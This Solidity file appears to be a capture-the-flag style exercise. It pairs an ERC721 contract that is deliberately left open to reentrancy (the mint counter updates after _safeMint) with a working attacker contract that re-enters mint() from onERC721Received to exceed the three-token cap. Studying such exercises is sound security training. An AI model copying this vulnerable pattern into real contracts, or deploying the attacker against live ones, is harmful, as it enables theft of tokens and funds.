// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

interface IOvermint1 {
    function mint() external;
    function balanceOf(address owner) external view returns (uint256);
}


contract Overmint1Attacker is IERC721Receiver{
    address public nft;

    constructor(address nft_) {   
        nft = nft_;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if(IOvermint1(msg.sender).balanceOf(address(this)) < 5){
            IOvermint1(nft).mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack () external {
        // for (uint256 i = 0; i < 5; i++) {
        IOvermint1(nft).mint();
    }

}
